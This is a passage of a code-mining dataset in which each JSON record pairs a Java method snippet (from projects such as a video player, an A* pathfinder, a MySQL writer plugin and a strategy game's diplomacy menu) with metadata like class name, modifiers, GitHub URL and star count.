["public"]}}, {"id": 57860, "method_name": "isPlaying", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPlaying() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.isPlaying();\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57861, "method_name": "seekTo", "class_name": "SystemPlayerManager", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void seekTo(long time) {\n        if (mediaPlayer != null) {\n            mediaPlayer.seekTo(time);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57862, "method_name": "getCurrentPosition", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getCurrentPosition() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getCurrentPosition();\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57863, "method_name": "getDuration", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getDuration() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getDuration();\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57864, "method_name": "getVideoSarNum", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarNum() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getVideoSarNum();\n        }\n        return 1;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57865, "method_name": "getVideoSarDen", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarDen() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getVideoSarDen();\n        }\n        return 1;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57866, "method_name": "isSurfaceSupportLockCanvas", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSurfaceSupportLockCanvas() {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57867, "method_name": "setSpeed", "class_name": "SystemPlayerManager", "params": ["float"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setSpeed(float speed) {\n        if (release) {\n            return;\n        }\n        if (mediaPlayer != null && mediaPlayer.getInternalMediaPlayer() != null && mediaPlayer.isPlayable()) {\n            try {\n                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {\n                    PlaybackParams playbackParams = new PlaybackParams();\n                    playbackParams.setSpeed(speed);\n                    mediaPlayer.getInternalMediaPlayer().setPlaybackParams(playbackParams);\n                } else {\n                    Debuger.printfError(\" not support setSpeed\");\n                }\n            } catch (Exception e){\n                e.printStackTrace();\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57868, "method_name": "getNetSpeed", "class_name": "SystemPlayerManager", "params": ["Context"], "throws": null, "modifiers": ["private"], "return_type": "long", "snippet": "    private long getNetSpeed(Context context) {\n        if (context == null) {\n            return 0;\n        }\n        long nowTotalRxBytes = TrafficStats.getUidRxBytes(context.getApplicationInfo().uid) == TrafficStats.UNSUPPORTED ? 0 : (TrafficStats.getTotalRxBytes() / 1024);//\u8f6c\u4e3aKB\n        long nowTimeStamp = System.currentTimeMillis();\n        long calculationTime = (nowTimeStamp - lastTimeStamp);\n        if (calculationTime == 0) {\n            return calculationTime;\n        }\n        //\u6beb\u79d2\u8f6c\u6362\n        long speed = ((nowTotalRxBytes - lastTotalRxBytes) * 1000 / calculationTime);\n        lastTimeStamp = nowTimeStamp;\n        lastTotalRxBytes = nowTotalRxBytes;\n        return speed;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 57869, "method_name": "find", "class_name": "AStar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<PathItem>", "snippet": "    public List<PathItem> find() {\n        PathItem item = getPathItemLinkedList();\n        path.clear();\n        if (item != null) {\n            calculatePath(item);\n        }\n        return path;\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57870, "method_name": "calculatePath", "class_name": "AStar", "params": ["PathItem"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void calculatePath(PathItem item) {\n        PathItem i = item;\n        while (i != null) {\n            path.add(0, i);\n            i = i.precedent;\n        }\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57871, "method_name": "getPathItemLinkedList", "class_name": "AStar", "params": [], "throws": null, "modifiers": [], "return_type": "PathItem", "snippet": "    PathItem getPathItemLinkedList() {\n        PathItem root = new PathItem();\n        root.coord = this.from;\n        openList.add(root);\n\n        while (openList.size() > 0) {\n            PathItem visiting = openList.remove(); // imagine it's the best\n            Coord visitingCoord = visiting.coord;\n\n            if (visitingCoord.equals(target)) {\n                return visiting;\n            }\n            if (closedList.containsKey(visitingCoord)) {\n                continue;\n            }\n            closedList.put(visitingCoord, visiting);\n\n            List<Coord> neighbors = grid.getNeighbours(visitingCoord);\n            for (Coord neighbor : neighbors) {\n                if (grid.get(neighbor).getType() == CellType.FLOOR) {\n                    addToOpenList(visiting, visitingCoord, neighbor);\n                }\n            }\n\n            if (grid.calculateDistance(visitingCoord, target) < grid.calculateDistance(nearest, target)) {\n                this.nearest = visitingCoord;\n            }\n        }\n        return null; // not found !\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57872, "method_name": "addToOpenList", "class_name": "AStar", "params": ["PathItem", "Coord", "Coord"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void addToOpenList(PathItem visiting, Coord fromCoord, Coord toCoord) {\n        if (closedList.containsKey(toCoord)) {\n            return;\n        }\n        PathItem pi = new PathItem();\n        pi.coord = toCoord;\n        pi.cumulativeLength = visiting.cumulativeLength + weightFunction.apply(toCoord);\n        int manh = grid.calculateDistance(fromCoord, toCoord);\n        pi.totalPrevisionalLength = pi.cumulativeLength + manh;\n        pi.precedent = visiting;\n        openList.add(pi);\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57873, "method_name": "getNearest", "class_name": "AStar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Coord", "snippet": "    public Coord getNearest() {\n        return nearest;\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57874, "method_name": "getShader", "class_name": "NoEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n\n        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"\n                + \"precision mediump float;\\n\"\n                + \"varying vec2 vTextureCoord;\\n\"\n                + \"uniform samplerExternalOES sTexture;\\n\" + \"void main() {\\n\"\n                + \"  gl_FragColor = texture2D(sTexture, vTextureCoord);\\n\"\n                + \"}\\n\";\n\n        return shader;\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/NoEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 57875, "method_name": "execute", "class_name": "ListCmd", "params": ["LibraryData"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute(LibraryData data) {\n        Objects.requireNonNull(data, LegalityCheck.LIBRARY_DATA_NULL_MESSAGE);\n\n        List<BookEntry> bookData = data.getBookData();\n        if (bookData.isEmpty()) {\n            System.out.println(\"The library has no book entries.\");\n            return;\n        }\n        System.out.println(bookData.size() + \" books in library:\");\n\n        for (BookEntry book : bookData) {\n            if (this.savedOption == ListCommandOptions.SHORT) {\n                System.out.println(book.getTitle());\n            }\n            if (this.savedOption == ListCommandOptions.LONG) {\n                // Print title\n                System.out.println(book.toString());\n                System.out.println();\n            }\n        }\n        System.out.println();\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/src/ListCmd.java", "stars": "6", "class_props": {"extends": "LibraryCommand", "implements": null, "modifiers": ["public"]}}, {"id": 57876, "method_name": "parseArguments", "class_name": "ListCmd", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean parseArguments(String argumentInput) {\n        Objects.requireNonNull(argumentInput, LegalityCheck.INPUT_ARGUMENT_NULL_MESSAGE);\n\n        switch (argumentInput) {\n\n            case LIST_COMMAND_OPTION_EMPTY:\n            case LIST_COMMAND_OPTION_SHORT:\n                this.savedOption = ListCommandOptions.SHORT;\n                return true;\n\n            case LIST_COMMAND_OPTION_LONG:\n                this.savedOption = ListCommandOptions.LONG;\n                return true;\n\n            default:\n                return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/src/ListCmd.java", "stars": "6", "class_props": {"extends": "LibraryCommand", "implements": null, "modifiers": ["public"]}}, {"id": 57877, "method_name": "store16", "class_name": "ROM", "params": ["int", "short"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void store16(int address, short value) {\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/ROM.java", "stars": "4", "class_props": {"extends": "Memory", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57878, "method_name": "store8", "class_name": "ROM", "params": ["int", "byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void store8(int address, byte value) {\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/ROM.java", "stars": "4", "class_props": {"extends": "Memory", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57879, "method_name": "init", "class_name": "GuiClick", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        GL11.glColor4f(1, 1, 1, 1);\n       // posX = 4;\n       // posY = 100;\n       // width = 400;\n        //height = 250;\n        //lastPosX = 2;\n        //lastPosY = 2;\n        panels.add(currentPanel = new MainPanel());\n        panels.add(new ModulesPanel());\n        panels.add(new FriendsPanel());\n        panels.add(new ConfigPanel());\n        panels.add(new SettingsPanel());\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 57880, "method_name": "drawScreen", "class_name": "GuiClick", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawScreen(int mouseX, int mouseY, float partialTicks) {\n        super.drawScreen(mouseX, mouseY, partialTicks);\n        /*if (dragging) {\n            this.posX = mouseX + this.lastPosX;\n            this.posY = mouseY + this.lastPosY;\n        }*/\n        /*RenderUtil.drawBorderedRect(posX, posY, posX + width, posY + height, 2, new Color(25,25,25).getRGB(), new Color(17,15,16,150).getRGB());\n        Gui.drawRect(posX + 2, posY + 2, posX + width - 2, posY + height - 2, new Color(25,25,25).getRGB());\n        RenderUtil.drawRoundedRect(posX + 40, posY + 25, posX + width - 100, posY + 35, 1, new Color(36, 36, 36).getRGB());\n        Gui.drawRect(posX + 2, posY + 40, posX + width - 2, posY + height - 2, new Color(29,29,29).getRGB());\n\n        currentPanel.draw(posX + 2, posY + 40, posX + width - 2, posY + height - 2);*/\n        ScaledResolution res = new ScaledResolution(mc);\n        int x = 0;\n        for (Panel panel : panels) {\n            float renderX = (res.getScaledWidth() / 2) + x - (panels.size() * 20);\n            if (panel == currentPanel) {\n                RenderUtil.drawBorderedRect(renderX - 2f, 2, renderX + font.getStringWidth(panel.getLabel()) + 1f, font.getHeight() + 3f, 1, new Color(0, 0, 0, 255).getRGB(), new Color(0, 0, 0, 137).getRGB());\n            }\n            font.drawStringWithShadow(panel.getLabel(), renderX, 3, -1);\n            x += font.getStringWidth(panel.getLabel()) + 10;\n        }\n        currentPanel.draw(mouseX, mouseY, partialTicks);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 57881, "method_name": "mouseClicked", "class_name": "GuiClick", "params": ["int", "int", "int"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseClicked(int mouseX, int mouseY, int mouseButton) throws IOException {\n        super.mouseClicked(mouseX, mouseY, mouseButton);\n        ScaledResolution res = new ScaledResolution(mc);\n        int x = 0;\n        for (Panel panel : panels) {\n            float renderX = (res.getScaledWidth() / 2) + x - (panels.size() * 20);\n            if (MouseUtil.withinBounds(mouseX, mouseY, renderX - 2f, 2, renderX + font.getStringWidth(panel.getLabel()) + 1f, font.getHeight() + 3f)) {\n                currentPanel = panel;\n            }\n            x += font.getStringWidth(panel.getLabel()) + 10;\n        }\n        /*if (MouseUtil.withinBounds(mouseX, mouseY, posX, posY, posX + width, posY + 20)) {\n            if (mouseButton == 0) {\n                dragging = true;\n                this.lastPosX = (posX - mouseX);\n                this.lastPosY = (posY - mouseY);\n            }\n        }*/\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 57882, "method_name": "mouseReleased", "class_name": "GuiClick", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseReleased(int mouseX, int mouseY, int mouseButton) {\n        super.mouseReleased(mouseX, mouseY, mouseButton);\n        /*if (mouseButton == 0) {\n            dragging = false;\n        }*/\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 57883, "method_name": "keyTyped", "class_name": "GuiClick", "params": ["char", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyTyped(char typedChar, int key) {\n        if (key == Keyboard.KEY_ESCAPE) {\n            Minecraft.getMinecraft().player.closeScreen();\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 57884, "method_name": "doesGuiPauseGame", "class_name": "GuiClick", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean doesGuiPauseGame()\n    {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/GuiClick.java", "stars": "12", "class_props": {"extends": "GuiScreen", "implements": null, "modifiers": ["public"]}}, {"id": 57885, "method_name": "preCheck", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void preCheck() {\n            this.init();\n            this.commonRdbmsWriterJob.writerPreCheck(this.originalConfig, DATABASE_TYPE);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57886, "method_name": "init", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void init() {\n            this.originalConfig = super.getPluginJobConf();\n            this.commonRdbmsWriterJob = new CommonRdbmsWriter.Job(DATABASE_TYPE);\n            this.commonRdbmsWriterJob.init(this.originalConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57887, "method_name": "prepare", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void prepare() {\n            //\u5b9e\u8dd1\u5148\u4e0d\u652f\u6301 \u6743\u9650 \u68c0\u9a8c\n            //this.commonRdbmsWriterJob.privilegeValid(this.originalConfig, DATABASE_TYPE);\n            this.commonRdbmsWriterJob.prepare(this.originalConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57888, "method_name": "split", "class_name": "Job", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "List<Configuration>", "snippet": "        public List<Configuration> split(int mandatoryNumber) {\n            return this.commonRdbmsWriterJob.split(this.originalConfig, mandatoryNumber);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57889, "method_name": "post", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void post() {\n            this.commonRdbmsWriterJob.post(this.originalConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57890, "method_name": "destroy", "class_name": "Job", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void destroy() {\n            this.commonRdbmsWriterJob.destroy(this.originalConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57891, "method_name": "init", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void init() {\n            this.writerSliceConfig = super.getPluginJobConf();\n            this.commonRdbmsWriterTask = new CommonRdbmsWriter.Task(DATABASE_TYPE);\n            this.commonRdbmsWriterTask.init(this.writerSliceConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57892, "method_name": "prepare", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void prepare() {\n            this.commonRdbmsWriterTask.prepare(this.writerSliceConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57893, "method_name": "startWrite", "class_name": "Task", "params": ["RecordReceiver"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void startWrite(RecordReceiver recordReceiver) {\n            this.commonRdbmsWriterTask.startWrite(recordReceiver, this.writerSliceConfig,\n                    super.getTaskPluginCollector());\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57894, "method_name": "post", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void post() {\n            this.commonRdbmsWriterTask.post(this.writerSliceConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57895, "method_name": "destroy", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void destroy() {\n            this.commonRdbmsWriterTask.destroy(this.writerSliceConfig);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57896, "method_name": "supportFailOver", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean supportFailOver() {\n            String writeMode = writerSliceConfig.getString(Key.WRITE_MODE);\n            return \"replace\".equalsIgnoreCase(writeMode);\n        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-mysqlwriter/src/main/java/com/alibaba/datax/plugin/writer/mysqlwriter/MysqlWriter.java", "stars": "23", "class_props": {"extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57897, "method_name": "show", "class_name": "PythonVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void show() {\n        System.out.println(\"\u8fd9\u662fPython\u8bfe\u7a0b\u7684\u89c6\u9891\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/abstractfactory/PythonVideo.java", "stars": "2", "class_props": {"extends": "Video", "implements": null, "modifiers": ["public"]}}, {"id": 57898, "method_name": "select", "class_name": "RoundRobinLoadBalancer", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T extends Instance> T select(T[] instances) {\n        int length = instances.length;\n        if (length == 0) {\n            throw new IllegalArgumentException();\n        }\n        return instances[counter.getAndIncrement() % length];\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/lb/RoundRobinLoadBalancer.java", "stars": "3", "class_props": {"extends": null, "implements": ["LoadBalancer"], "modifiers": ["public"]}}, {"id": 57899, "method_name": "create", "class_name": "DiplomacyTechOfferMenu", "params": ["Empire", "Empire", "DiplomaticReply", "Tech"], "throws": null, "modifiers": ["public", "static"], "return_type": "DiplomacyTechOfferMenu", "snippet": "    public static DiplomacyTechOfferMenu create(Empire e1, Empire requestor, DiplomaticReply r, Tech t) {\n        DiplomacyTechOfferMenu msg = new DiplomacyTechOfferMenu();\n        msg.requestee = e1;\n        msg.requestedTech = t;\n        msg.diplomat(requestor);\n        msg.reply(r);\n        return msg;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57900, "method_name": "hasCounterOffers", "class_name": "DiplomacyTechOfferMenu", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasCounterOffers()  { return !counterOffers.isEmpty(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57901, "method_name": "diplomat", "class_name": "DiplomacyTechOfferMenu", "params": ["Empire"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void diplomat(Empire v)               { \n        super.diplomat(v); \n        counterOffers = requestee.diplomatAI().techsRequestedForCounter(diplomat(), requestedTech);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57902, "method_name": "showTalking", "class_name": "DiplomacyTechOfferMenu", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean showTalking()        { return false; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57903, "method_name": "numReplies", "class_name": "DiplomacyTechOfferMenu", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numReplies()       \t\t{ return counterOffers.size()+1; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57904, "method_name": "reply", "class_name": "DiplomacyTechOfferMenu", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String reply(int i)          { \n        if (i < counterOffers.size()){\n            Tech tech = counterOffers.get(i);\n            return text(tech.name());\n        }\n        if (i == counterOffers.size())\n            return text(\"DIPLOMACY_MENU_FORGET_IT\");\n        return \"\"; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57905, "method_name": "replyDetail", "class_name": "DiplomacyTechOfferMenu", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String replyDetail(int i)          {\n        if (i < counterOffers.size()){\n            Tech tech = counterOffers.get(i);\n            return text(\"TECH_TRADE_TIER_COST_INFO\", str(tech.quintile+1), str((int) tech.researchCost()));\n        }\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57906, "method_name": "enabled", "class_name": "DiplomacyTechOfferMenu", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean enabled(int i) { \n        return i <= counterOffers.size();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57907, "method_name": "select", "class_name": "DiplomacyTechOfferMenu", "params": 